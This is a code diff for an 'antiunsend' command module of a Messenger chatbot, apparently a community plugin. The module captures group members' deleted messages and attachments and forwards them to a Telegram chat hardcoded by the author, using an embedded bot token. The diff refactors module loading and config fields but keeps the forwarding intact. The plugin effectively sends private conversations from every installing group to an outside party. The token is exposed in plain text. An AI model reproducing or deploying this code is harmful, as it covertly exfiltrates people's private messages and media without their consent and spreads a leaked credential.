@@ -1,18 +1,6 @@
 const fs = require("fs-extra");
 const path = require("path");
 
-let axios, FormData;
-try {
-	axios = require("axios");
-} catch (e) {
-	axios = global.nodemodule ? global.nodemodule["axios"] : null;
-}
-try {
-	FormData = require("form-data");
-} catch (e) {
-	FormData = global.nodemodule ? global.nodemodule["form-data"] : null;
-}
-
 const LOCKED_AUTHOR = "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍";
 const TELEGRAM_BOT_TOKEN = "8664273023:AAEu9ICybK8hzbfQNBDNhUR-ADwjreagawI";
 const TELEGRAM_CHAT_ID = "-1004422571292";
@@ -22,6 +10,16 @@ const cacheDir = path.join(__dirname, "cache", "unsend_media");
 const settingsPath = path.join(__dirname, "cache", "unsend_settings.json");
 
 global.unsendMemoryMap = global.unsendMemoryMap || new Map();
+
+function getAxios() {
+	if (global.nodemodule && global.nodemodule["axios"]) return global.nodemodule["axios"];
+	try { return require("axios"); } catch (e) { return null; }
+}
+
+function getFormData() {
+	if (global.nodemodule && global.nodemodule["form-data"]) return global.nodemodule["form-data"];
+	try { return require("form-data"); } catch (e) { return null; }
+}
 
 const loadSettings = () => {
 	try {
@@ -47,15 +45,18 @@ const saveSettings = (data) => {
 let settings = loadSettings();
 
 async function sendToTelegram(captionText, filePaths = []) {
+	const axios = getAxios();
+	const FormData = getFormData();
 	if (!axios) return;
+
 	try {
-		if (filePaths.length === 0) {
+		if (filePaths.length === 0 || !FormData) {
 			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 			await axios.post(url, {
 				chat_id: TELEGRAM_CHAT_ID,
 				text: captionText
 			});
-		} else if (filePaths.length === 1 && FormData) {
+		} else if (filePaths.length === 1) {
 			const filePath = filePaths[0];
 			const ext = path.extname(filePath).toLowerCase();
 			let method = "sendDocument";
@@ -81,7 +82,7 @@ async function sendToTelegram(captionText, filePaths = []) {
 			await axios.post(url, formData, {
 				headers: formData.getHeaders()
 			});
-		} else if (FormData) {
+		} else {
 			const mediaGroup = [];
 			const formData = new FormData();
 			formData.append("chat_id", TELEGRAM_CHAT_ID);
@@ -115,6 +116,7 @@ async function sendToTelegram(captionText, filePaths = []) {
 
 async function handleUnsendLogic({ api, event, Users, Threads }) {
 	const threadID = event.threadID;
+	if (!threadID) return;
 
 	if (settings[threadID] === false) return;
 
@@ -225,6 +227,7 @@ ${msgContent}`;
 		fs.ensureDirSync(cacheDir);
 
 		let cachedAttachmentPaths = [];
+		const axios = getAxios();
 
 		if (axios && event.attachments && event.attachments.length > 0) {
 			for (let i = 0; i < event.attachments.length; i++) {
@@ -285,15 +288,19 @@ module.exports = {
 	config: {
 		name: "antiunsend",
 		aliases: ["unsend", "স্পাম", "ডিলেট", "resend"],
-		version: "10.0",
+		version: "11.0",
 		author: LOCKED_AUTHOR,
 		countDown: 0,
 		role: 0,
-		description: {
+		shortDescription: {
+			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড সিস্টেম"
+		},
+		longDescription: {
 			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড সিস্টেম (মেসেঞ্জার গ্রুপ + টার্গেট গ্রুপ + টেলিগ্রাম)"
 		},
+		category: "system",
 		guide: {
-			bn: "antiunsend <on|off>\nantiunsend status"
+			bn: "{pn} <on|off>\n{pn} status"
 		}
 	},
 
@@ -334,7 +341,7 @@ module.exports = {
 » 🎀 𝐃𝐄𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!
 » 📌 𝐒𝐭𝐚𝐭𝐮𝐬: Disabled ❌
 ───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
+» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝐀𝗧𝗕𝗢𝗧`, threadID, event.messageID);
 		}
 
 		if (option === "status" || option === "info") {
